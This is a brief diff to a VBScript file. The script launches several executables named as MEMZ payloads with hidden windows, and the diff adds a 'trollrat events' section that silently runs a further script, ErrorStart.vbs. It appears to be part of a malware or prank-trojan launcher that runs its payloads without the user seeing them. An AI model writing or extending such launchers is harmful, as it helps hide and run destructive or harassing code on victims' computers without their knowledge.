@@ -21,3 +21,6 @@ WScript.Sleep 850
 WSHShell.Run "MEMZPayloads-6.exe", 0
 WScript.Sleep 650
 WSHShell.Run "MEMZPayloads-1.exe", 0
+'trollrat events down here
+WScript.Sleep 850
+WSHShell.Run "wscript ..\Wahoo\ErrorStart.vbs", 0
